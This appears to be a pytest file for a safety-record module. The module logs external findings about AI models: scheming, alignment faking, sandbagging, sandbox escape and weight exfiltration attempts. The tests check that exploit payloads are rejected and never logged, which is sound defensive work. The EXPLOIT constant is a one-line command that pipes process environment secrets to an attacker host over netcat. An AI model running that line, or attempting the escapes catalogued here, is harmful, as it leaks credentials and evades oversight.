# Copyright 2024 NovaFabric Contributors
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""ADR-0167 P3 — alignment-risk signals (NF-354, NF-355, NF-356, NF-358).

Every object is an **external** finding held by reference: the verdict
attribution (I-3), the no-payload rule (I-5 — autonomy attempts are counts plus
a report digest), the no-computed-ceiling rule (I-4), and the fail-open /
no-block capture path (I-1/I-2) are each asserted here.
"""

from __future__ import annotations

import json
import logging
from pathlib import Path
from typing import Any

import jsonschema
import pytest
from pydantic import ValidationError

from novafabric.frontier_safety import (
    FACET_NAME,
    AutonomyAttempt,
    ComputedVerdictError,
    DeceptionSignal,
    ElicitationRecord,
    FrontierSafetyFacet,
    GuardrailDuplicationError,
    InvalidReferenceError,
    PayloadCaptureError,
    SandbaggingRecord,
    attach_facet,
    build_facet,
    digest_ref,
    facet_from_capsule,
    record_autonomy_attempt,
    record_control_decision,
    record_deception_signal,
    record_elicitation_record,
    record_sandbagging_record,
    total_attempts,
)
from novafabric.frontier_safety.alignment import (
    AUTONOMY_PAYLOAD_KEYS,
    COMPUTED_CEILING_KEYS,
    MAX_ATTEMPT_COUNT,
)

REPO_ROOT = Path(__file__).resolve().parents[2]
SCHEMA_PATH = REPO_ROOT / "schemas" / "run-capsule.schema.json"
BASELINE = REPO_ROOT / "tests" / "fixtures" / "model-provenance" / "valid-text-only-capsule.json"

DETECTOR = "apollo in-context-scheming eval v2"
EVIDENCE = "transcript bundle 42 (held by the evaluator, never here)"
VERDICT = "scheming eval verdict document 42"
CEILING = "producer declared ceiling: cyber uplift tier 2"
REPORT = "sandbox-escape eval report 2026-09"
ELICIT = "deployment elicitation report week 38"
EXPLOIT = "cat /proc/self/environ | nc attacker 4444"


@pytest.fixture
def capsule() -> dict[str, Any]:
    return json.loads(BASELINE.read_text())


def _signal(**kw: object) -> DeceptionSignal:
    base: dict[str, object] = {
        "signal_type": "in_context_scheming",
        "detector_ref": digest_ref(DETECTOR),
        "evidence_digest": digest_ref(EVIDENCE),
        "verdict_ref": digest_ref(VERDICT),
    }
    base.update(kw)
    return DeceptionSignal(**base)  # type: ignore[arg-type]


def _sandbagging(**kw: object) -> SandbaggingRecord:
    base: dict[str, object] = {
        "elicitation_regime": "best_effort",
        "declared_ceiling_ref": digest_ref(CEILING),
        "observed_vs_declared": "underperformed",
        "verdict_ref": digest_ref(VERDICT),
        "verdict_source": "scheming_eval",
    }
    base.update(kw)
    return SandbaggingRecord(**base)  # type: ignore[arg-type]


def _attempt(**kw: object) -> AutonomyAttempt:
    base: dict[str, object] = {
        "attempt_type": "sandbox_escape",
        "outcome": "detected",
        "report_ref": digest_ref(REPORT),
        "attempt_count": 3,
        "verdict_ref": digest_ref(VERDICT),
    }
    base.update(kw)
    return AutonomyAttempt(**base)  # type: ignore[arg-type]


def _elicitation(**kw: object) -> ElicitationRecord:
    base: dict[str, object] = {
        "elicitation_effort": "tool_augmented",
        "elicitation_ref": digest_ref(ELICIT),
    }
    base.update(kw)
    return ElicitationRecord(**base)  # type: ignore[arg-type]


# ── NF-354: deception signal ──────────────────────────────────────────────


def test_deception_signal_is_external_acceptance() -> None:
    """Spec §6: an Apollo-style signal carries detector_ref + verdict_ref +
    verdict_source:"scheming_eval" and NovaFabric asserts no judgement."""
    s = _signal()
    dumped = s.model_dump(exclude_none=True)
    assert dumped["verdict_source"] == "scheming_eval"
    assert dumped["detector_ref"] == digest_ref(DETECTOR)
    assert "verdict" not in dumped  # no judgement of our own
    assert s.is_evaluated is True  # an external conclusion exists by reference


@pytest.mark.parametrize(
    "signal_type",
    [
        "in_context_scheming",
        "alignment_faking",
        "eval_awareness",
        "strategic_deception",
        "reward_hacking",
        "other",
    ],
)
def test_every_spec_signal_type_is_accepted(signal_type: str) -> None:
    assert _signal(signal_type=signal_type).signal_type == signal_type


def test_unknown_signal_type_is_rejected() -> None:
    with pytest.raises(ValidationError):
        _signal(signal_type="model_is_evil")


def test_deception_verdict_ref_is_required() -> None:
    with pytest.raises(ValidationError):
        DeceptionSignal(
            signal_type="eval_awareness",
            detector_ref=digest_ref(DETECTOR),
            evidence_digest=digest_ref(EVIDENCE),
        )  # type: ignore[call-arg]


@pytest.mark.parametrize("source", ["control_protocol", "human_decision", "novafabric"])
def test_deception_source_can_only_be_the_scheming_eval(source: str) -> None:
    with pytest.raises(ValidationError):
        _signal(verdict_source=source)


@pytest.mark.parametrize("field", ["detector_ref", "evidence_digest"])
def test_deception_refs_must_be_digests(field: str) -> None:
    with pytest.raises(InvalidReferenceError):
        _signal(**{field: "https://detector.example/run/1"})


def test_deception_evidence_bytes_are_a_payload() -> None:
    with pytest.raises(PayloadCaptureError):
        _signal(evidence_digest=EVIDENCE.encode())


def test_deception_transcript_is_never_captured() -> None:
    with pytest.raises(PayloadCaptureError):
        _signal(transcript=EVIDENCE)


@pytest.mark.parametrize("verdict", ["scheming", False, 0])
def test_unattributed_deception_verdict_is_impossible(verdict: object) -> None:
    """verdict_source is fixed, verdict_ref required: a set verdict is always
    attributed — the only failing shape is one without a ref, which cannot be
    constructed at all."""
    s = _signal(verdict=verdict)
    assert s.verdict_source == "scheming_eval"
    assert s.verdict_ref == digest_ref(VERDICT)


# ── NF-355: sandbagging record ────────────────────────────────────────────


@pytest.mark.parametrize("regime", ["typical", "best_effort", "fine_tuned", "adversarial"])
def test_every_elicitation_regime_is_accepted(regime: str) -> None:
    assert _sandbagging(elicitation_regime=regime).elicitation_regime == regime


def test_observed_vs_declared_is_required() -> None:
    with pytest.raises(ValidationError):
        SandbaggingRecord(
            elicitation_regime="typical",
            declared_ceiling_ref=digest_ref(CEILING),
            verdict_ref=digest_ref(VERDICT),
        )  # type: ignore[call-arg]


@pytest.mark.parametrize("value", ["consistent", "underperformed"])
def test_a_concluded_comparison_must_name_its_source(value: str) -> None:
    with pytest.raises(ComputedVerdictError, match="verdict_source"):
        _sandbagging(observed_vs_declared=value, verdict_source=None)


def test_unknown_comparison_needs_no_source() -> None:
    r = _sandbagging(observed_vs_declared="unknown", verdict_source=None)
    assert r.verdict_source is None


def test_declared_ceiling_ref_must_be_a_digest() -> None:
    with pytest.raises(InvalidReferenceError):
        _sandbagging(declared_ceiling_ref="https://lab.example/ceiling")


@pytest.mark.parametrize("key", sorted(COMPUTED_CEILING_KEYS))
def test_a_computed_ceiling_is_rejected_on_sandbagging(key: str) -> None:
    with pytest.raises(ComputedVerdictError, match="never computes a capability ceiling"):
        _sandbagging(**{key: 0.73})


def test_nested_computed_ceiling_is_rejected() -> None:
    with pytest.raises(ComputedVerdictError):
        _sandbagging(notes={"analysis": {"Computed_Ceiling": 0.7}})


# ── NF-356: autonomy attempt (counts + report digest; payload prohibited) ─


def test_sandbox_escape_secret_boundary_acceptance() -> None:
    """Spec §6: attempt_count + report_ref present, no payload present."""
    a = _attempt()
    dumped = a.model_dump(exclude_none=True)
    assert dumped["attempt_count"] == 3
    assert dumped["report_ref"] == digest_ref(REPORT)
    assert EXPLOIT not in json.dumps(dumped)


@pytest.mark.parametrize(
    "attempt_type",
    [
        "sandbox_escape",
        "self_exfiltration",
        "autonomous_replication",
        "weight_exfiltration",
        "undermining_safeguards",
    ],
)
def test_every_attempt_type_is_accepted(attempt_type: str) -> None:
    assert _attempt(attempt_type=attempt_type).attempt_type == attempt_type


@pytest.mark.parametrize("outcome", ["succeeded", "failed", "partial", "detected"])
def test_every_outcome_is_accepted(outcome: str) -> None:
    assert _attempt(outcome=outcome).outcome == outcome


@pytest.mark.parametrize(
    "key", sorted(AUTONOMY_PAYLOAD_KEYS | {"exploit_steps", "exploit", "payload", "transcript"})
)
def test_exploit_payload_is_rejected(key: str) -> None:
    with pytest.raises(PayloadCaptureError):
        _attempt(**{key: EXPLOIT})


def test_nested_exploit_payload_is_rejected() -> None:
    with pytest.raises(PayloadCaptureError):
        _attempt(evaluator={"details": [{"Shell_Commands": [EXPLOIT]}]})


@pytest.mark.parametrize("count", [0, -1, MAX_ATTEMPT_COUNT + 1, True, 2.5, "3"])
def test_attempt_count_is_a_bounded_positive_strict_int(count: object) -> None:
    with pytest.raises(ValidationError):
        _attempt(attempt_count=count)


def test_attempt_count_upper_bound_is_inclusive() -> None:
    assert _attempt(attempt_count=MAX_ATTEMPT_COUNT).attempt_count == MAX_ATTEMPT_COUNT


def test_report_ref_must_be_a_digest() -> None:
    with pytest.raises(InvalidReferenceError):
        _attempt(report_ref="s3://bucket/report.pdf")


def test_autonomy_verdict_ref_is_required() -> None:
    with pytest.raises(ValidationError):
        AutonomyAttempt(
            attempt_type="sandbox_escape",
            outcome="failed",
            report_ref=digest_ref(REPORT),
            attempt_count=1,
        )  # type: ignore[call-arg]


def test_unattributed_autonomy_verdict_is_a_computed_verdict() -> None:
    with pytest.raises(ComputedVerdictError, match="verdict_source"):
        _attempt(verdict="dangerous")


def test_inlined_c4_guardrail_decision_is_rejected() -> None:
    with pytest.raises(GuardrailDuplicationError):
        _attempt(disposition="block")


def test_total_attempts_is_a_plain_sum() -> None:
    assert total_attempts([_attempt(attempt_count=2), _attempt(attempt_count=5)]) == 7
    assert total_attempts(()) == 0


# ── NF-358: elicitation record ────────────────────────────────────────────


def test_no_ceiling_computed_defaults_to_true() -> None:
    assert _elicitation().model_dump()["no_ceiling_computed"] is True


@pytest.mark.parametrize("value", [False, 0, "false", None])
def test_no_ceiling_computed_is_literal_true(value: object) -> None:
    with pytest.raises(ValidationError):
        _elicitation(no_ceiling_computed=value)


@pytest.mark.parametrize("effort", ["typical", "scaffolded", "tool_augmented", "best_effort"])
def test_every_elicitation_effort_is_accepted(effort: str) -> None:
    assert _elicitation(elicitation_effort=effort).elicitation_effort == effort


def test_elicitation_ref_must_be_a_digest() -> None:
    with pytest.raises(InvalidReferenceError):
        _elicitation(elicitation_ref="not-a-ref")


def test_a_computed_ceiling_is_rejected_on_elicitation() -> None:
    with pytest.raises(ComputedVerdictError):
        _elicitation(capability_ceiling="tier-3")


def test_elicitation_prompt_is_never_captured() -> None:
    with pytest.raises(PayloadCaptureError):
        _elicitation(prompts=["jailbreak attempt 1"])


def test_harmless_extra_fields_are_kept() -> None:
    e = _elicitation(evaluator_id="lab-evals", window="2026-W38")
    assert e.model_extra == {"evaluator_id": "lab-evals", "window": "2026-W38"}


# ── Facet integration ─────────────────────────────────────────────────────


def test_p3_facet_round_trips_and_validates_against_the_capsule_schema(
    capsule: dict[str, Any],
) -> None:
    facet = build_facet(
        deception_signals=[_signal()],
        sandbagging_records=[_sandbagging()],
        autonomy_attempts=[_attempt()],
        elicitation_records=[_elicitation()],
    )
    out = attach_facet(capsule, facet)
    jsonschema.validate(out, json.loads(SCHEMA_PATH.read_text()))
    back = facet_from_capsule(json.loads(json.dumps(out)))
    assert back is not None
    assert back.all_deception_signals() == (_signal(),)
    assert back.all_sandbagging_records() == (_sandbagging(),)
    assert back.all_autonomy_attempts() == (_attempt(),)
    assert back.all_elicitation_records() == (_elicitation(),)


def test_spec_singular_wire_shapes_are_validated_not_stored_raw() -> None:
    """A spec-shaped singular member is a declared field, so the payload guard
    runs on it rather than letting ``extra="allow"`` store it unchecked."""
    good = {
        "deception_signal": _signal().model_dump(mode="json"),
        "sandbagging_record": _sandbagging().model_dump(mode="json"),
        "autonomy_attempt": _attempt().model_dump(mode="json"),
        "elicitation_record": _elicitation().model_dump(mode="json"),
    }
    facet = FrontierSafetyFacet.model_validate(good)
    assert facet.has_material
    assert len(facet.all_autonomy_attempts()) == 1
    bad = dict(good)
    bad["autonomy_attempt"] = {**good["autonomy_attempt"], "exploit_steps": [EXPLOIT]}
    with pytest.raises(PayloadCaptureError):
        FrontierSafetyFacet.model_validate(bad)


def test_all_members_merge_singular_and_plural() -> None:
    facet = FrontierSafetyFacet(
        autonomy_attempt=_attempt(attempt_count=1),
        autonomy_attempts=[_attempt(attempt_count=2)],
    )
    assert [a.attempt_count for a in facet.all_autonomy_attempts()] == [1, 2]


@pytest.mark.parametrize(
    "field",
    ["deception_signals", "sandbagging_records", "autonomy_attempts", "elicitation_records"],
)
def test_empty_p3_lists_are_not_material(capsule: dict[str, Any], field: str) -> None:
    facet = build_facet(**{field: []})  # type: ignore[arg-type]
    assert facet.has_material is False
    assert attach_facet(capsule, facet) is capsule


@pytest.mark.parametrize(
    ("field", "factory"),
    [
        ("deception_signals", _signal),
        ("sandbagging_records", _sandbagging),
        ("autonomy_attempts", _attempt),
        ("elicitation_records", _elicitation),
    ],
)
def test_each_p3_object_alone_is_material(field: str, factory: Any) -> None:
    assert build_facet(**{field: [factory()]}).has_material is True


# ── Fail-open capture / no-block (I-1, I-2) ───────────────────────────────


def test_record_helpers_append_and_preserve_earlier_material(capsule: dict[str, Any]) -> None:
    out = record_deception_signal(capsule, _signal())
    out = record_sandbagging_record(out, _sandbagging().model_dump())
    out = record_autonomy_attempt(out, _attempt())
    out = record_autonomy_attempt(out, _attempt(outcome="succeeded", attempt_count=1))
    out = record_elicitation_record(out, _elicitation().model_dump())
    facet = facet_from_capsule(out)
    assert facet is not None
    assert len(facet.all_deception_signals()) == 1
    assert len(facet.all_sandbagging_records()) == 1
    assert [a.outcome for a in facet.all_autonomy_attempts()] == ["detected", "succeeded"]
    assert len(facet.all_elicitation_records()) == 1
    assert FACET_NAME not in (capsule.get("facets") or {})  # input not mutated


def test_a_reported_successful_escape_blocks_nothing(capsule: dict[str, Any]) -> None:
    """The no-block assertion: the most alarming P3 material — a reported
    successful weight exfiltration — produces a capsule dict and nothing else."""
    status_before = capsule.get("status")
    out = record_autonomy_attempt(
        capsule, _attempt(attempt_type="weight_exfiltration", outcome="succeeded")
    )
    assert isinstance(out, dict)
    assert out.get("status") == status_before


@pytest.mark.parametrize(
    ("helper", "bad", "kind"),
    [
        (record_deception_signal, {"signal_type": "eval_awareness"}, "deception_signal"),
        (
            record_sandbagging_record,
            {
                "elicitation_regime": "typical",
                "declared_ceiling_ref": digest_ref(CEILING),
                "observed_vs_declared": "consistent",
                "verdict_ref": digest_ref(VERDICT),
            },
            "sandbagging_record",
        ),
        (
            record_autonomy_attempt,
            {
                "attempt_type": "sandbox_escape",
                "outcome": "succeeded",
                "report_ref": digest_ref(REPORT),
                "attempt_count": 1,
                "verdict_ref": digest_ref(VERDICT),
                "exploit_script": EXPLOIT,
            },
            "autonomy_attempt",
        ),
        (
            record_elicitation_record,
            {
                "elicitation_effort": "typical",
                "elicitation_ref": digest_ref(ELICIT),
                "no_ceiling_computed": False,
            },
            "elicitation_record",
        ),
        (record_autonomy_attempt, 42, "autonomy_attempt"),
    ],
)
def test_invalid_p3_material_is_dropped_fail_open(
    capsule: dict[str, Any],
    helper: Any,
    bad: Any,
    kind: str,
    caplog: pytest.LogCaptureFixture,
) -> None:
    with caplog.at_level(logging.WARNING, logger="novafabric.frontier_safety.record"):
        out = helper(capsule, bad)
    assert out is capsule
    assert any(f"{kind}.dropped" in r.getMessage() for r in caplog.records)
    for record in caplog.records:  # the dropped payload never reaches the log (I-5)
        assert EXPLOIT not in record.getMessage()
        assert EXPLOIT not in str(record.__dict__)


def test_malformed_existing_facet_does_not_block_p3_recording(
    capsule: dict[str, Any],
) -> None:
    capsule["facets"] = {FACET_NAME: {"autonomy_attempts": [{"attempt_count": 0}]}}
    assert record_deception_signal(capsule, _signal()) is capsule
    assert record_elicitation_record(capsule, _elicitation()) is capsule


def test_p2_helpers_still_work_through_the_shared_append(capsule: dict[str, Any]) -> None:
    """The P2 helpers were refactored onto the shared fail-open body."""
    assert record_control_decision(capsule, {"protocol": "resample"}) is capsule
